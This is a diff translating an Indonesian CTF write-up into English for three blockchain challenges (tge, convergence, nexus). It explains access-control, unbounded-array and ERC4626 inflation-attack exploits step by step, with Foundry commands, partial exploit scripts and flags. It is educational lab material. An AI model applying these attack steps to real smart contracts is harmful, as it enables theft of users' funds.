-di C2C CTF 20226 ini, aku mendapatkan pengalaman pertama ku berhadapan dengan Blockchain challenge. AKu banyak menggunakan Gemini untuk memahami istilah dan cara kerja dari blockchain disini
+In C2C CTF 2026, this was my first experience working on a blockchain challenge. I relied heavily on Gemini to understand blockchain concepts and how the system works in this challenge.
 
-Pertama, aku mencoba memahami alur kerja challenge dan mencari "Goal" dari challenge ini.
+First, I tried to understand the overall challenge flow and identify the **goal**.
 
-pada file `Setup.sol` terdapat fungsi `isSolved()` ini
+In `Setup.sol`, there is an `isSolved()` function:
 
 ```solidity
 function isSolved() external view returns (bool) {
@@ -1425,9 +1430,9 @@ function isSolved() external view returns (bool) {
 }
 ```
 
-Dari sini disimpulkan bahwa targetku sebagai player adalah untuk membuat status `userTiers` menjadi 3 (Tier 3).
+From this, I concluded that my objective as the player is to make `userTiers` equal to **3 (Tier 3)**.
 
-Dari file `Setup.sol` juga bisa dilihat fungsi `constructor` yang menginisiasi state awal saat instance dijalankan.
+From `Setup.sol`, we can also see the `constructor`, which initializes the initial state when the instance is deployed:
 
 ```solidity
 constructor(address _player) {
@@ -1439,33 +1444,42 @@ constructor(address _player) {
 }
 ```
 
-Aku sebagai player diberi modal 15 token
+As the player, I am given **15 tokens** as starting capital.
 
-Selanjutnya, analisa ke file `TGE.sol` untuk memahami mekanisme meningkatkan `userTiers`
+Next, I analyzed `TGE.sol` to understand how `userTiers` can be increased:
 
-1. **Tier 1**: ada fungsi `buy()`. Fungsi ini meminta player membayar sejumlah token (harga Tier 1 adalah 15). Karena player memiliki modal 15 token, player bisa beli Tier 1.
-2. **Tier 2 & 3**: ada fungsi `upgrade(uint256 tier)`. Tapi fungsi ini memiliki banyak requirements.
+1. **Tier 1**: There is a `buy()` function. This function requires the player to pay a certain amount of tokens (Tier 1 costs 15 tokens). Since the player starts with exactly 15 tokens, Tier 1 can be purchased legitimately.
+2. **Tier 2 & Tier 3**: There is an `upgrade(uint256 tier)` function, but this function has multiple requirements.
 
-Disini, Gemini menemukan vulnerabilities
+At this point, Gemini identified several vulnerabilities:
 
-* Di `Setup.sol`, ada fungsi `enableTge(bool _tge)` yang statusnya `public`. Ini artinya siapapun bisa menyalakan atau mematikan periode TGE sebebasnya
-* Di `TGE.sol`, setiap kali TGE dimatikan, kontrak akan mengambil snapshot dari total supply saat itu dan menyimpan di `preTGESupply`
+- In `Setup.sol`, there is a function `enableTge(bool _tge)` which is marked as `public`. This means **anyone** can freely turn the TGE period on or off.
+- In `TGE.sol`, every time the TGE is turned off, the contract takes a snapshot of the total supply at that moment and stores it in `preTGESupply`.
 
-Dari Gemini, berikut skenario exploitnya
+Based on Gemini’s analysis, the exploit scenario is as follows:
 
-1. **Pemanasan:** Beli Tier 1 secara sah menggunakan 15 token dari modal
-2. **Sabotase Snapshot:** Panggil `setup.enableTge(false)`. Karena tidak ada yang memiliki Tier 2 atau Tier 3, `preTGESupply` untuk Tier tersebut dicatat sebagai **0**.
-3. **Membuka Celah:** Panggil `setup.enableTge(true)` agar bisa melakukan upgrade kembali. Sekarang status `tgeActivated` sudah `true` (karena pernah dimatikan sekali) dan `isTgePeriod` juga `true`
-4. **Bypass Validasi:** Saat memanggil `upgrade(2)`, kontrak mengecek apakah saldo kamu lebih besar dari suplai di snapshot (`preTGEBalance > preTGESupply`). Karena suplainya 0 (hasil sabotase sebelumnya), maka saldo **1** saja sudah dianggap lebih besar dan player diizinkan naik tier.
-5. **Finishing:** Ulangi hal yang sama untuk naik ke Tier 3.
+1. **Warm-up**  
+   Buy Tier 1 legitimately using the initial 15 tokens.
+
+2. **Snapshot Sabotage**  
+   Call `setup.enableTge(false)`. Since no one owns Tier 2 or Tier 3 at this point, the `preTGESupply` for those tiers is recorded as **0**.
+
+3. **Reopen TGE**  
+   Call `setup.enableTge(true)` to allow upgrades again. At this point, `tgeActivated` is already `true` (because TGE was disabled once), and `isTgePeriod` is also `true`.
+
+4. **Validation Bypass**  
+   When calling `upgrade(2)`, the contract checks whether the user’s balance is greater than the snapshot supply (`preTGEBalance > preTGESupply`). Since the snapshot supply is **0**, even a balance of **1 token** satisfies this condition, allowing the player to upgrade.
+
+5. **Finishing**  
+   Repeat the same process to upgrade to **Tier 3**.
 
 ## Exploit
 
-Pertama, jalankan instance dengan blockchain launcher untuk mendapatkan credentials ke instance.
+First, I launched the instance using the blockchain launcher to obtain the credentials.
 
 [image here]
 
-Selanjutnya copy credentials dan masukkan ke `exploit.py` ini
+Next, I copied the credentials and placed them into the following `exploit.py` script:
 
 ```pyhton
 from web3 import Web3
@@ -1540,7 +1554,7 @@ send_tx(tge.functions.upgrade(3), "Upgrade to Tier 3")
 print("\n[🎯] Exploit Finished! You're on Tier 3 now.")
 ```
 
-Berikut output exploit:
+Exploit output:
 
 ```bash
 (ctf-env) lasangna@sandbox:~/ctf/bc/tge$ python3 exploit.py 
@@ -1569,11 +1583,11 @@ Flag: **`C2C{just_a_warmup_from_someone_who_barely_warms_up}`**
 
 ## AI Usage
 
-yes, i use AI to solve this challenge. I used **Gemini 3 Pro**. For the subscription, it's from Google AI Pro with Student Account.
+Yes, I used AI to solve this challenge. I used **Gemini 3 Pro**, accessed through Google AI Pro with a Student Account subscription.
 
-Seperti yang sudah aku bilang sebelumnya, bahwa ini pengalaman pertamaku dalam mengerjakan blockchain challenge, jadi aku masih sangat awam mengenai istilah atupun cara kerja. Untuk itu aku menggunakan Gemini untuk memperlajari istilah dan cara kerja sistem, menganalisa vulnerabilities dan membuat script exploit
+As mentioned earlier, this was my first blockchain challenge, and I was still very unfamiliar with both the terminology and how the system works. Therefore, I used Gemini to learn the concepts, analyze vulnerabilities, and write the exploit script.
 
-Berikut prompt yang aku gunakan:
+Some of the prompts I used were:
 
 ```
 there's these files
@@ -1589,15 +1603,15 @@ what should i analyze first
 how can i get isSolved() to return true?
 ```
 
-Disini aku banyak menggunakan bantuan dari Gemini, jadi metodologi yang aku gunakan untuk memverifikasi output dari Gemini adalah dengan mencoba output yang diberikan Gemini dan mengirimkan hasil outputnya sebagai feedback ke Gemini hinggga mendapatkan flag-nya.
+Since I relied heavily on Gemini, my methodology for verifying its output was to directly test the suggested steps and provide feedback to Gemini until the flag was obtained.
 
 ---
 
 # blockchain/convergence
 
-Pertama, aku mencoba memahami alur kerja challenge dan mencari "Goal" dari challenge ini.
+First, I tried to understand the overall challenge flow and identify the **goal**.
 
-pada file `Setup.sol` terdapat fungsi `isSolved()` ini
+In `Setup.sol`, there is the following `isSolved()` function:
 
 ```solidity
 function isSolved() external view returns (bool) {
@@ -1605,46 +1619,50 @@ function isSolved() external view returns (bool) {
 }
 ```
 
-Artinya, tujuan utama disini adalah membuat vaariable `ascende` di `Challenge.sol` terisi dengan sebuah *address*. Variabel ascended ini hanya bisa diubah melalui fungsi `transcend(bytes calldata truth)`.
+This means the main objective is to make the `ascended` variable in `Challenge.sol` contain a non-zero *address*.  
+The `ascended` variable can only be set via the `transcend(bytes calldata truth)` function.
 
-Agar fungsi transcend() berhasil dipanggil, player harus memenuhi beberapa syarat:
-1. Player harus terdaftar sebagai seeker dengan memanggil `registerSeeker()` terlebih dahulu.
-2. Payload `truth` yang player kirimkan harus sudah terdaftar (ter-hash) di variabel *setup.chronicles(seal)*.
-3. Saat `truth` di-decode sebagai `(SoulFragment[], bytes32, uint32, address, address)`, parameternya harus memenuhi:
-    * Parameter ke-4 (`invoker`) harus `msg.sender`.
-    * Parameter ke-5 (`witness`) harus `msg.sender`.
-    * Total `essence` dari semua `SoulFragment` harus ≥1000 ether.
+To successfully call `transcend()`, the player must satisfy several conditions:
 
-Disini, aku meminta bantuan Gemini untuk menganalisa code dan menemukan terdapat vulnerability di fungsi `bindPact` di `Setup.sol`
+1. The player must be registered as a seeker by calling `registerSeeker()` first.
+2. The `truth` payload submitted by the player must already be registered (hashed) in `setup.chronicles(seal)`.
+3. When `truth` is decoded as `(SoulFragment[], bytes32, uint32, address, address)`, the parameters must satisfy:
+   - The 4th parameter (`invoker`) must be `msg.sender`.
+   - The 5th parameter (`witness`) must be `msg.sender`.
+   - The total `essence` from all `SoulFragment` entries must be **≥ 1000 ether**.
 
-Fungsi `bindPact` membatasi kekuatan essence:
+At this point, I asked Gemini to analyze the code and it identified a vulnerability in the `bindPact` function in `Setup.sol`.
+
+The `bindPact` function limits the essence value per fragment:
 
 ```solidity
 require(fragments[i].essence <= 100 ether, "Essence too powerful for pact");
 ```
 
-Namun, **tidak ada batasan jumlah fragment yang boleh dikirimkan**.
+However, **there is no limit on the number of fragments that can be submitted**.
 
-Jadi, untuk mencapai total `1000 ether` yang dibutuhkan `transcend()`, kamu cukup:
-1. Membuat sebuah `agreement` berisi array dari **10 buah** `SoulFragment`, di mana masing-masing memiliki `essence = 100 ether`. Totalnya akan pas menjadi 1000 ether.
-2. Isi `binder` dan `witness` dengan address player (`msg.sender`).
-3. Kirim payload bytes tersebut ke `Setup.bindPact()`.
-4. Kirim payload bytes yang sama persis ke `Challenge.transcend()`.
+Therefore, to reach the required total of `1000 ether` for `transcend()`, we can:
 
-> **Note**: Variabel `CONVERGENCE_REQUIREMENT = 100` tidak pernah di-cek di dalam fungsi `transcend`, jadi bisa diabaikan sebagai pengecoh).
+1. Create an `agreement` containing an array of **10 `SoulFragment`s**, each with `essence = 100 ether`.  
+   The total essence becomes exactly `1000 ether`.
+2. Set both `invoker` and `witness` to the player’s address (`msg.sender`).
+3. Submit this encoded payload to `Setup.bindPact()`.
+4. Submit the **exact same payload** again to `Challenge.transcend()`.
+
+> **Note:** The variable `CONVERGENCE_REQUIREMENT = 100` is never checked inside `transcend()`, so it can be ignored as a red herring.
 
 ## Exploit
 
-Disini untuk menjalankan exploit, aku menggunakan `foundry`
+To execute the exploit, I used **Foundry**.
 
-Pertama, Inisialisasi foundry kemudian pindahkan file solidity yang diberikan dari challenge ke direktori `src/`
+First, initialize a Foundry project and move the Solidity files provided by the challenge into the `src/` directory:
 
 ```bash
 forge init exploit --empty
 mv Challenge.sol Setup.sol exploit/src/
 ```
 
-Selanjutnya export kredensial instance ke environment variables
+Next, export the instance credentials into environment variables:
 
 ```bash
 export RPC_URL="..."
@@ -1653,15 +1671,15 @@ export SETUP_CONTRACT_ADDR="..."
 export WALLET_ADDR="..."
 ```
 
-> **Note**: Tambahkan `0x` prefix untuk `PRIVKEY` karena pada file exploit, nantinya akan menggunakan `vm.envUnit` yang mengharuskan *hex string* diawali dengan `0x`
+> **Note:** Make sure to add the `0x` prefix to `PRIVKEY`, because the exploit script later uses `vm.envUint`, which requires a hex string starting with `0x`.
 
-Selanjutnya aku meminta Gemini untuk membuatkan file exploit `Solve.s.sol` ke direktori `exploit/script/`
+Next, I asked Gemini to create the exploit script `Solve.s.sol` inside the `exploit/script/` directory:
 
 ```bash
 touch exploit/script/Solve.s.sol
 ```
 
-berikut file `Solve.s.sol`
+Below is the content of `Solve.s.sol`:
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -1690,16 +1708,16 @@ contract Solve is Script {
 }
 ```
 
-Setelah itu, eksekusi exploit:
+After that, I executed the exploit:
 
 ```bash
-forge script Solve.s.sol:Solve \
+forge script script/Solve.s.sol:Solve \
     --rpc-url $RPC_URL \
     --broadcast \
     -vvvv
 ```
 
-Berikut output dari exploit:
+Exploit output:
 
 ```bash
 lasangna@sandbox:~/ctf/bc/convergence/exploit$ forge script script/Solve.s.sol:Solve \
@@ -1800,15 +1818,15 @@ Sensitive values saved to: /home/lasangna/ctf/bc/convergence/exploit/cache/Solve
 
 [image here]
 
-Flag: **`...`**
+Flag: **`C2C{the_convergence_chall_is_basically_bibibibi}`**
 
 ## AI Usage
 
-yes, i use AI to solve this challenge. I used **Gemini 3 Pro**. For the subscription, it's from Google AI Pro with Student Account.
+Yes, I used AI to solve this challenge. I used **Gemini 3 Pro**, accessed through Google AI Pro with a Student Account subscription.
 
-Ini pengalaman pertamaku dalam mengerjakan blockchain challenge, jadi aku masih sangat awam mengenai istilah atupun cara kerja. Untuk itu aku menggunakan Gemini untuk memperlajari cara kerja sistem, menganalisa vulnerabilities dan membuat script exploit
+This was my first time working on a blockchain challenge, so I was still very unfamiliar with both the terminology and how the system works. For that reason, I relied on Gemini to understand the system design, analyze vulnerabilities, and generate the exploit script.
 
-Berikut prompt yang aku gunakan:
+Some of the prompts I used include:
 
 ```
 there's these files
@@ -1827,15 +1845,15 @@ how can i get isSolved() to return true?
 create solver script for this challenge
 ```
 
-Disini aku banyak menggunakan bantuan dari Gemini, jadi metodologi yang aku gunakan untuk memverifikasi output dari Gemini adalah dengan mencoba output yang diberikan Gemini dan mengirimkan hasil outputnya sebagai feedback ke Gemini hinggga mendapatkan flag-nya.
+Since I relied heavily on Gemini, my methodology for verifying its output was to directly test the suggested results and provide feedback to Gemini until the flag was obtained.
 
 ---
 
 # blockchain/nexus
 
-Pertama, aku mencoba memahami alur kerja challenge dan mencari "Goal" dari challenge ini.
+First, I tried to understand the overall challenge flow and identify the **goal**.
 
-pada file `Setup.sol` terdapat fungsi `isSolved()` ini
+In `Setup.sol`, there is the following `isSolved()` function:
 
 ```solidity
 contract Setup {
@@ -1854,66 +1872,74 @@ contract Setup {
 }
 ```
 
-Dari analisa semua file yang diberikan, berikut beberapa informasi yang didapatkan
+From analyzing all the provided files, I gathered the following information:
 
-*  `player` memulai dengan 10,000 `ether` (dalam bentuk token `Essence`).
-*  Untuk memicu `isSolved() == true`, *balance* `Essence` player harus melebihi `ASCENSION_THRESHOLD` yaitu 20,250 `ether`
-*  Artinya, player harus mencari cara untuk mencuri atau melipatgandakan *balance* sebesar lebih dari **10,250** `ether`.
-*  Sumber uang yang bisa dicuri ada di dalam `function conductRituals()`, di mana `Setup` mencetak **15,000** `ether` untuk dirinya sendiri dan melakukan deposit (`attune`) ke `CrystalNexus` dalam dua tahap: 6,000 dan 9,000.
+- The `player` starts with **10,000 ether** worth of `Essence` tokens.
+- To make `isSolved()` return `true`, the player’s `Essence` balance must exceed the `ASCENSION_THRESHOLD`, which is **20,250 ether**.
+- This means the player must find a way to steal or multiply their balance by more than **10,250 ether**.
+- A large source of funds exists in `conductRituals()`, where `Setup` mints **15,000 ether** to itself and deposits (`attune`) them into `CrystalNexus` in two stages: 6,000 and 9,000.
 
-Aku meminta bantuan ke Gemini untuk menganalisa files dan menemukan vulnerability di file `CrystalNexus.sol`
+I asked Gemini to analyze the files and it identified a vulnerability in `CrystalNexus.sol`.
 
-Sistem ini menggunakan rasio dinamis untuk menghitung berapa `crystals` (saham pool) yang kamu dapatkan saat menyetor `Essence`.
+This system uses a dynamic ratio to calculate how many `crystals` (pool shares) are minted when depositing `Essence`.
 
-pada function `essenceTocrystal`:
+In the `essenceToCrystal` function:
 
 ```solidity
 return (essenceAmount * totalCrystals) / amp;
 ```
 
-Ini adalah vulnerability **ERC4626 Inflation Attack** (atau pembulatan ke nol). Karena pembagian bilangan bulat di Solidity membulatkan ke bawah, jika amp (total `Essence` di dalam *smart contract*) jauh lebih besar dari `totalCrystals`, penyerang bisa membuat nilai crystals yang didapatkan korban menjadi **0**.
+This introduces an **ERC4626 Inflation Attack** (or integer division rounding-to-zero issue). Since Solidity integer division rounds down, if `amp` (the total `Essence` held by the contract) is much larger than `totalCrystals`, a victim can receive **0 crystals** for a deposit.
 
-Berikut adalah **exploit scenario** untuk challenge ini
+The **exploit scenario** is as follows:
 
-1. **Inisialisasi `totalCrystals` sekecil mungkin**: 
+1. **Initialize `totalCrystals` as small as possible**
 
-    Panggil `nexus.attune(1)` menggunakan 1 `wei`.
-(Sekarang `totalCrystals` = 1, `amp` = 1).
+   Call `nexus.attune(1)` using **1 wei**.  
+   (`totalCrystals = 1`, `amp = 1`)
 
-2. **Inflasi `amp` secukupnya:**
+2. **Artificially inflate `amp`**
 
-    Panggil `essence.transfer(address(nexus), 6000 ether)`.
+   Call:
+   ```solidity
+   essence.transfer(address(nexus), 6000 ether);
+   ```
+   The player still keeps ~4,000 ether safely in their wallet, while `amp` becomes `6000 ether + 1 wei`.
 
-    (Sekarang player masih memegang sisa ~4,000 `ether` di wallet yang aman dari potongan. Di sisi lain, `amp` kini menjadi `6000 ether + 1 wei`).
+3. **Exploit the victim (Setup contract)**
 
-3. **Eksekusi korban:**
+   Call `setup.conductRituals()`:
+   - First deposit (6,000 ether):  
+     `(6000 * 1) / 6000.000...01 = 0` → Setup receives **0 crystals**
+   - Second deposit (9,000 ether):  
+     `(9000 * 1) / 12000.000...01 = 0` → Setup receives **0 crystals**
+   - The full **15,000 ether** is added to the pool for free.  
+     `amp` becomes ~21,000 ether.
 
-    Panggil `setup.conductRituals()`.
-    * Deposit pertama (6,000 `ether`): `(6000 * 1) / 6000.00...01` = 0. `Setup` dapat 0 `crystals`.
-    * Deposit kedua (9,000 `ether`): `(9000 * 1) / 12000.00...01` = 0. `Setup` dapat 0 `crystals`.
-    * Uang 15,000 `ether` milik `Setup` masuk ke pool secara gratis. `amp` kini menjadi 21,000 `ether`.
+4. **Extract profit**
 
-4. **Ekstrak profit:**
+   Call:
+   ```solidity
+   nexus.dissolve(1, player);
+   ```
+   You redeem your 1 wei crystal for ~21,000 ether.  
+   After the **22% friction fee**, you receive **16,380 ether**.
 
-    Panggil `nexus.dissolve(1, player)`.
-    
-    Kamu mencairkan 1 `wei` milikmu yang bernilai 21,000 `ether`. Dipotong *friction 22%*, kamu mendapatkan kembali **16,380** `ether`.
-    
-5. **Kalkulasi Kemenangan:**
-    
-    Sisa uang di *wallet* (~4,000) + Hasil curian (16,380) = **20,380** `ether`.
-**(20,380 > 20,250)**.
+5. **Win condition**
+
+   Remaining wallet balance (~4,000) + drained amount (16,380)  
+   = **20,380 ether**, which is greater than **20,250 ether**.
 
 ## Exploit
 
-Pertama, Inisialisasi foundry kemudian pindahkan file solidity yang diberikan dari challenge ke direktori `src/`
+First, initialize a Foundry project and move the Solidity files into `src/`:
 
 ```bash
 forge init exploit --empty
 mv CrystalNexus.sol Essence.sol Setup.sol exploit/src/
 ```
 
-Selanjutnya export kredensial instance ke environment variables
+Next, export the instance credentials as environment variables:
 
 ```bash
 export RPC_URL="..."
@@ -1922,11 +1948,11 @@ export SETUP_CONTRACT_ADDR="..."
 export WALLET_ADDR="..."
 ```
 
-> **Note**: Tambahkan `0x` prefix untuk `PRIVKEY` karena pada file exploit, nantinya akan menggunakan `vm.envUnit` yang mengharuskan *hex string* diawali dengan `0x`
+> **Note:** Add the `0x` prefix to `PRIVKEY` because the exploit script uses `vm.envUint`, which requires a hex string starting with `0x`.
 
-Selanjutnya aku meminta Gemini untuk membuatkan file `ExploitScript.s.sol` ke direktori `exploit/script/`
+Then, I asked Gemini to generate `ExploitScript.s.sol` inside `exploit/script/`:
 
-berikut file `ExploitScript.s.sol`
+Below is the content of `ExploitScript.s.sol`
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -1984,7 +2010,7 @@ contract ExploitScript is Script {
 }
 ```
 
-Setelah itu, eksekusi exploit:
+Execute the exploit:
 
 ```bash
 forge script script/ExploitScript.s.sol:ExploitScript \
@@ -1994,7 +2020,7 @@ forge script script/ExploitScript.s.sol:ExploitScript \
   -vvvv
 ```
 
-Berikut output dari exploit:
+Exploit output:
 
 ```bash
 lasangna@sandbox:~/ctf/bc/nexus/exploit$ forge script script/ExploitScript.s.sol:ExploitScript \
@@ -2232,11 +2258,11 @@ Flag: **`C2C{the_essence_of_nexus_is_donation_hahahaha}`**
 
 ## AI Usage
 
-yes, i use AI to solve this challenge. I used **Gemini 3 Pro**. For the subscription, it's from Google AI Pro with Student Account.
+Yes, I used AI to solve this challenge. I used **Gemini 3 Pro**, accessed through Google AI Pro with a Student Account subscription.
 
-Ini pengalaman pertamaku dalam mengerjakan blockchain challenge, jadi aku masih sangat awam mengenai istilah atupun cara kerja. Untuk itu aku menggunakan Gemini untuk memperlajari cara kerja sistem, menganalisa vulnerabilities dan membuat script exploit
+This was my first time working on a blockchain challenge, so I was still unfamiliar with many of the concepts and mechanics. I used Gemini to learn how the system works, analyze vulnerabilities, and generate the exploit script.
 
-Berikut prompt yang aku gunakan:
+Some of the prompts I used were:
 
 ```
 there's these files
@@ -2256,4 +2282,4 @@ how can i get isSolved() to return true?
 create solver script for this challenge
 ```
 
-Disini aku banyak menggunakan bantuan dari Gemini, jadi metodologi yang aku gunakan untuk memverifikasi output dari Gemini adalah dengan mencoba output yang diberikan Gemini dan mengirimkan hasil outputnya sebagai feedback ke Gemini hinggga mendapatkan flag-nya.
+Since I relied heavily on Gemini, my methodology for verifying its output was to directly test the generated results and iterate based on the observed behavior until the flag was obtained.
